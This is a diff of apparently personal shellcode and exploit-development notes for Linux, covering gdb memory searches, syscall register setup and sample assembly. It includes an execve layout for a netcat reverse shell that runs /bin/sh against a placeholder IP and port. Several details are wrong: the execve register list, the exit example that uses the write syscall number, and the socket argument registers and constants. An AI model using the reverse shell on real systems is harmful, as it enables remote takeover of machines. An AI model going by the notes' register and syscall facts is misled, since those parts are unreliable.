@@ -1,7 +1,13 @@
 execve registers: rdi,rsi,rbx
 
 gdb search for strings in libc
-first functions need to be imported, then run find &<functionname>,9999999,"<string>"  
+
+Searching memory
+first functions need to be imported, then run 
+find &<functionname>,9999999,"<string>"  
+another example
+find /b 0x7ffff7842000,0x7ffff7bd4000, '/','b','i','n','/','s','h'
+
 #to follow forked shell
 set follow-fork-mode child
 
@@ -10,5 +16,67 @@ execve shellcode setup
 eax = 0x3b
 order: rdi, rsi, rdx
 
+###################################################################
 write shellcode setup
 
+ssize_t sys_write(unsigned int fd, const char * buf, size_t count)
+
+rax - temporary register; when we call a syscal, rax must contain syscall number
+rdx - used to pass 3rd argument to functions
+rdi - used to pass 1st argument to functions
+rsi - pointer used to pass 2nd argument to functions
+
+sample ASM x86:
+
+
+    mov     edx,len                             ;message length
+    mov     ecx,msg                             ;message to write
+    mov     ebx,1                               ;file descriptor (stdout)
+    mov     eax,4                               ;system call number (sys_write)
+    int     0x80                                ;call kernel
+
+    mov     eax,1                               ;system call number (sys_exit)
+    int     0x80                                ;call kernel
+    
+ sample ASM x64:
+
+section .data
+    msg db      "hello, world!"
+
+section .text
+    global _start
+_start:
+    mov     rax, 1
+    mov     rdi, 1
+    mov     rsi, msg
+    mov     rdx, 13
+    syscall
+    mov    rax, 60    ;exit
+    mov    rdi, 0
+    syscall
+###################################################################
+
+exit ASM
+
+    mov     rax, 1
+    xor     rdi, rdi
+    syscall
+    
+###################################################################
+
+Socket
+
+rsi = 1 (AF_NET)
+rdi = 2 (SOCK_STREAM)
+rax = 0x29
+r9  = IP ADDRESS
+
+###################################################################
+NC reverse shell
+0x3b syscall        rdi       rsi      r9     r10    rbx    rcx     rdx
+execve          ("/bin/nc",{"/bin/nc","<ip>","1337","-e","/bin/sh"},NULL)
+
+###################################################################
+fgets register setup
+rax = ptr to file descriptor; 01 for stdin
+rdi = stack ptr where string will be stored
